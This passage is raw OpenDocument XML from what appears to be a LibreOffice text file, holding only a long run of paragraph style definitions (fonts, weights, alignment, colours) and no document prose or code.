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Menlo" svg:font-family="Menlo, Monaco, 'Courier New', monospac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paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="bold" officeooo:rsid="0009c88c" officeooo:paragraph-rsid="0009c88c" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="006297e7" officeooo:paragraph-rsid="006297e7" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="00744e95" officeooo:paragraph-rsid="00744e95" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P5"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Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" officeooo:rsid="0009c88c" officeooo:paragraph-rsid="0009c88c" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" officeooo:rsid="0009c88c" officeooo:paragraph-rsid="000b8aed" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" officeooo:rsid="0009c88c" officeooo:paragraph-rsid="000c5055" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" officeooo:rsid="0009c88c" officeooo:paragraph-rsid="000cae8e" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" officeooo:rsid="0009c88c" officeooo:paragraph-rsid="000d290d" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" officeooo:rsid="0009c88c" officeooo:paragraph-rsid="000dc684" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" officeooo:rsid="0009c88c" officeooo:paragraph-rsid="0019a4d7" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="006297e7" officeooo:paragraph-rsid="0062a49f" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" officeooo:paragraph-rsid="002d6bf8"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00673b4a" officeooo:paragraph-rsid="006d5189"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="006ba391" officeooo:paragraph-rsid="006ba391"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="006ba391" officeooo:paragraph-rsid="006e8ca9"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-weight="normal" officeooo:paragraph-rsid="006d5189"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-weight="normal" officeooo:paragraph-rsid="006e8ca9"/>
    </style:style>
    <style:style style:name="P20"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9c88c" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P21"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b8aed" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P22"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5055" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P23"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cae8e" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P24"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290d" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" officeooo:rsid="0009c88c" officeooo:paragraph-rsid="000dc684" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" officeooo:rsid="000e6a2f" officeooo:paragraph-rsid="000e6a2f" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="000e6a2f" officeooo:paragraph-rsid="000e6a2f" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="000dc684" officeooo:paragraph-rsid="000dc684" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P29" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="000eaa87" officeooo:paragraph-rsid="000eaa87" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P30" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00108dfc" officeooo:paragraph-rsid="00108dfc" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P31" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="001d8ecf" officeooo:paragraph-rsid="001e614d" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P32" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="001d8ecf" officeooo:paragraph-rsid="001f8083" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P33" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="001d8ecf" officeooo:paragraph-rsid="001ffbbb" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P34" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="001f8083" officeooo:paragraph-rsid="001f8083" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P35" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00202346" officeooo:paragraph-rsid="00202346" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P36" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="001dcdaf" officeooo:paragraph-rsid="001e614d" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P37" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="001ffbbb" officeooo:paragraph-rsid="001ffbbb" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P38" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="002195f7" officeooo:paragraph-rsid="002195f7" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P39" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="0012301e" officeooo:paragraph-rsid="0012301e" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P40" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="0013f571" officeooo:paragraph-rsid="0013f571" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P41" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="001d7028" officeooo:paragraph-rsid="001d7028" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P42"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2cf288" officeooo:paragraph-rsid="002eea4f" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P43" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="006c16a4" officeooo:paragraph-rsid="006e8ca9" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P44"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3239bb"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32a77" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P46"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239bb" officeooo:paragraph-rsid="0054d7c6" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P47"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5528d" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P48"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3a2c01" officeooo:paragraph-rsid="005a5591" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P49" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00813e98" officeooo:paragraph-rsid="00813e98" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P50" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:paragraph-rsid="009f3861"/>
    </style:style>
    <style:style style:name="P51" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00a56f34" officeooo:paragraph-rsid="00a56f34"/>
    </style:style>
    <style:style style:name="P52" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00a56f34" officeooo:paragraph-rsid="00aa62b4"/>
    </style:style>
    <style:style style:name="P53" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00a56f34" officeooo:paragraph-rsid="00b46af1"/>
    </style:style>
    <style:style style:name="P54" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00acb0e2" officeooo:paragraph-rsid="00ada864"/>
    </style:style>
    <style:style style:name="P55" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00acb0e2" officeooo:paragraph-rsid="00b03d32"/>
    </style:style>
    <style:style style:name="P56" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00acb0e2" officeooo:paragraph-rsid="00b46af1"/>
    </style:style>
    <style:style style:name="P57" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00b08a55" officeooo:paragraph-rsid="00b46af1"/>
    </style:style>
    <style:style style:name="P58" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:paragraph-rsid="00b46af1"/>
    </style:style>
    <style:style style:name="P59"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bold" officeooo:rsid="0030710d" officeooo:paragraph-rsid="0030710d" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P60" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="009f3861" officeooo:paragraph-rsid="009f3861" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P61" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="004eb9d6" officeooo:paragraph-rsid="004eb9d6"/>
    </style:style>
    <style:style style:name="P62" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Times New Roman" fo:font-size="14pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00b03d32" officeooo:paragraph-rsid="00b03d32" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P63" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Times New Roman" fo:font-size="14pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00ce0832" officeooo:paragraph-rsid="00ce7af6" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P64" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Times New Roman" fo:font-size="14pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00c99d31" officeooo:paragraph-rsid="00c99d31" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P65" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Times New Roman" fo:font-size="14pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00b9772d" officeooo:paragraph-rsid="00b9772d" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P66" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Times New Roman" fo:font-size="14pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00b9772d" officeooo:paragraph-rsid="00bc7c07" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P67" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Times New Roman" fo:font-size="14pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00b9772d" officeooo:paragraph-rsid="00c5bb92" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P68" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Times New Roman" fo:font-size="14pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00bd1b96" officeooo:paragraph-rsid="00bd1b96" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P69" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Times New Roman" fo:font-size="14pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00bd1b96" officeooo:paragraph-rsid="00bdafc5" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P70" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Times New Roman" fo:font-size="14pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00bd1b96" officeooo:paragraph-rsid="00c99d31" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P71" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Times New Roman" fo:font-size="14pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00ce0832" officeooo:paragraph-rsid="00ce0832" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P72" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:color="#000000" style:font-name="Liberation Serif" officeooo:paragraph-rsid="003473e4"/>
    </style:style>
    <style:style style:name="P73" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:color="#000000" style:font-name="Liberation Serif" officeooo:paragraph-rsid="003ad1eb"/>
    </style:style>
    <style:style style:name="P74" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="003d34eb" officeooo:paragraph-rsid="003f9523"/>
    </style:style>
    <style:style style:name="P75" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="003d34eb" officeooo:paragraph-rsid="005c20fe"/>
    </style:style>
    <style:style style:name="P76" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="003f9523" officeooo:paragraph-rsid="00409c94"/>
    </style:style>
    <style:style style:name="P77" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="00423cc4" officeooo:paragraph-rsid="00458729"/>
    </style:style>
    <style:style style:name="P78" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="00423cc4" officeooo:paragraph-rsid="005dbac4"/>
    </style:style>
    <style:style style:name="P79" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:paragraph-rsid="00458729"/>
    </style:style>
    <style:style style:name="P80" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="0046416a" officeooo:paragraph-rsid="0046416a"/>
    </style:style>
    <style:style style:name="P81" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:paragraph-rsid="004eb9d6"/>
    </style:style>
    <style:style style:name="P82" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:paragraph-rsid="0075f85d"/>
    </style:style>
    <style:style style:name="P83" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="008b4fdb" officeooo:paragraph-rsid="008b4fdb"/>
    </style:style>
    <style:style style:name="P84" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:paragraph-rsid="00954d43"/>
    </style:style>
    <style:style style:name="P85" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="00d28abd" officeooo:paragraph-rsid="00d309da"/>
    </style:style>
    <style:style style:name="P86" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-size="14pt" officeooo:rsid="00d28abd" officeooo:paragraph-rsid="00d69ac1" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P87" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-size="14pt" officeooo:rsid="00d3d167" officeooo:paragraph-rsid="00d3d167" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P88" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-size="14pt" officeooo:rsid="00d3de4b" officeooo:paragraph-rsid="00d8a2e5" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P89" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:paragraph-rsid="00d4925e"/>
    </style:style>
    <style:style style:name="P90" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P91" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="0017af47"/>
    </style:style>
    <style:style style:name="P92" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0017af47" officeooo:paragraph-rsid="0017af47"/>
    </style:style>
    <style:style style:name="P93" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6"/>
    </style:style>
    <style:style style:name="P94" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono"/>
    </style:style>
    <style:style style:name="P95" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" officeooo:rsid="003f9523" officeooo:paragraph-rsid="00409c94"/>
    </style:style>
    <style:style style:name="P96" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" officeooo:paragraph-rsid="0046416a"/>
    </style:style>
    <style:style style:name="P97" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" officeooo:rsid="0046416a" officeooo:paragraph-rsid="0046416a"/>
    </style:style>
    <style:style style:name="P98" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" fo:background-color="#232525"/>
    </style:style>
    <style:style style:name="P99" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" officeooo:paragraph-rsid="006547ce" fo:background-color="#232525"/>
    </style:style>
    <style:style style:name="P100" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" officeooo:paragraph-rsid="00673b4a" fo:background-color="#232525"/>
    </style:style>
    <style:style style:name="P101" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" officeooo:paragraph-rsid="00844288" fo:background-color="#232525"/>
    </style:style>
    <style:style style:name="P102" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" fo:font-weight="normal" officeooo:rsid="00673b4a" officeooo:paragraph-rsid="006a6ad7"/>
    </style:style>
    <style:style style:name="P103" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" officeooo:paragraph-rsid="0075f85d"/>
    </style:style>
    <style:style style:name="P104" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" officeooo:paragraph-rsid="00813e98"/>
    </style:style>
    <style:style style:name="P105" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" officeooo:rsid="00858417" officeooo:paragraph-rsid="0085f5a8"/>
    </style:style>
    <style:style style:name="P106" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" officeooo:rsid="00875f19" officeooo:paragraph-rsid="00875f19"/>
    </style:style>
    <style:style style:name="P107" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6" fo:background-color="#232525"/>
    </style:style>
    <style:style style:name="P108" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:orphans="2" fo:widows="2"/>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal"/>
    </style:style>
    <style:style style:name="P109" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="003d34eb" officeooo:paragraph-rsid="003f9523"/>
    </style:style>
    <style:style style:name="P110" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="003f9523" officeooo:paragraph-rsid="00409c94"/>
    </style:style>
    <style:style style:name="P111" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
